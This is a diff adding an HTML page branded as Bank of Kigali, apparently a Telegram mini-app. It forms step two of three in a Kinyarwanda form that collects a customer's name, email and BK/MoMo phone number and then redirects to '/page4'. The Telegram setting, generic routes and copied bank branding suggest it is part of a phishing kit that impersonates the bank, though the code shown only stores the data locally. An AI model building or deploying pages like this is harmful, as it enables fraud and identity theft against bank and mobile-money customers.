@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="rw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bank of Kigali - Amakuru yawe</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --bk-blue: #002b49;
+            --bk-blue-hover: #001f35;
+            --bk-accent: #00a3e0;
+            --bg-color: #f0f4f8;
+            --card-bg: #ffffff;
+            --text-main: #0f172a;
+            --text-muted: #64748b;
+            --input-border: #cbd5e1;
+            --btn-gray: #e2e8f0;
+            --btn-gray-text: #475569;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .app-header {
+            width: 100%;
+            background-color: var(--bk-blue);
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .back-btn-top {
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            font-size: 18px;
+            font-weight: 800;
+            color: white;
+        }
+
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .menu-icon span {
+            display: block;
+            width: 22px;
+            height: 3px;
+            background-color: white;
+            border-radius: 2px;
+        }
+
+        .card {
+            background: white;
+            width: 90%;
+            max-width: 440px;
+            margin: 20px 0 30px;
+            padding: 32px 24px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 43, 73, 0.08);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 24px;
+            color: var(--text-main);
+            margin: 0 0 6px;
+            text-align: center;
+            font-weight: 800;
+        }
+
+        .subtext {
+            font-size: 14px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 0 auto 32px;
+            width: 80%;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 4px;
+            background-color: #e2e8f0;
+            border-radius: 2px;
+        }
+
+        .step-bar.active {
+            background-color: var(--bk-blue);
+        }
+
+        .form-group {
+            margin-bottom: 22px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            font-size: 15px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 10px;
+        }
+
+        .form-control {
+            font-size: 15px;
+            padding: 14px 16px;
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            background-color: #ffffff;
+            color: #334155;
+            outline: none;
+            width: 100%;
+        }
+
+        .form-control:focus {
+            border-color: var(--bk-blue);
+        }
+
+        .phone-group {
+            display: flex;
+            gap: 10px;
+        }
+
+        .country-prefix {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            background-color: #f1f5f9;
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            padding: 0 14px;
+            font-weight: 700;
+            font-size: 15px;
+            color: #0f172a;
+            white-space: nowrap;
+        }
+
+        .flag-icon {
+            font-size: 18px;
+            line-height: 1;
+        }
+
+        .phone-hint {
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: 8px;
+        }
+
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .btn-prev {
+            background-color: var(--btn-gray);
+            color: var(--btn-gray-text);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .btn-next {
+            background-color: var(--bk-blue);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: var(--bk-blue-hover);
+        }
+
+        .footer-banner {
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: auto;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">← Subira</a>
+    <div class="header-title">Bank of Kigali</div>
+    <div class="menu-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Amakuru yawe</h1>
+    <div class="subtext">Intambwe 2 kuri 3</div>
+
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar"></div>
+    </div>
+
+    <form id="step2Form" onsubmit="goNext(event)">
+        <div class="form-group">
+            <label for="firstName">Izina Ry'iribanza</label>
+            <input type="text" id="firstName" class="form-control" placeholder="Jean Paul" required>
+        </div>
+
+        <div class="form-group">
+            <label for="lastName">Amazina y'Umuryango</label>
+            <input type="text" id="lastName" class="form-control" placeholder="Mugabo" required>
+        </div>
+
+        <div class="form-group">
+            <label for="email">Imeyili (Email)</label>
+            <input type="email" id="email" class="form-control" placeholder="jean.mugabo@example.rw" required>
+        </div>
+
+        <div class="form-group">
+            <label for="phone">Nimero ya Telefoni ya BK / Momo</label>
+            <div class="phone-group">
+                <div class="country-prefix">
+                    <span class="flag-icon">🇷🇼</span>
+                    <span>+250</span>
+                </div>
+                <input type="tel" id="phone" class="form-control" placeholder="781234567" maxlength="9" pattern="[7][2389][0-9]{7}" required>
+            </div>
+            <div class="phone-hint">Imibare 9 itangira na 7 (urugero: 781234567)</div>
+        </div>
+
+        <div class="btn-container">
+            <button type="button" class="btn-prev" onclick="goBack()">INYUMA</button>
+            <button type="submit" class="btn-next">KOMEZA</button>
+        </div>
+    </form>
+</div>
+
+<div class="footer-banner">
+    © 2026 Bank of Kigali Rwanda
+</div>
+
+<script>
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        const fName = localStorage.getItem('firstName');
+        const lName = localStorage.getItem('lastName');
+        const email = localStorage.getItem('email');
+        const phone = localStorage.getItem('phone');
+
+        if (fName) document.getElementById('firstName').value = fName;
+        if (lName) document.getElementById('lastName').value = lName;
+        if (email) document.getElementById('email').value = email;
+        if (phone) document.getElementById('phone').value = phone;
+    };
+
+    function goNext(event) {
+        event.preventDefault();
+
+        const fName = document.getElementById('firstName').value.trim();
+        const lName = document.getElementById('lastName').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+
+        if (!fName || !lName || !email || !phone) {
+            alert("Nyamunekauzuza ibisabwa byose.");
+            return;
+        }
+
+        if (!/^7[2389]\d{7}$/.test(phone)) {
+            alert("Nyamuneka shyiramo nimero y'u Rwanda yemewe (itangira na 7).");
+            return;
+        }
+
+        localStorage.setItem('firstName', fName);
+        localStorage.setItem('lastName', lName);
+        localStorage.setItem('email', email);
+        localStorage.setItem('phone', phone);
+        localStorage.setItem('userPhone', phone);
+
+        window.location.href = "/page4";
+    }
+
+    function goBack() {
+        window.location.href = "/page2";
+    }
+</script>
+
+</body>
+</html>
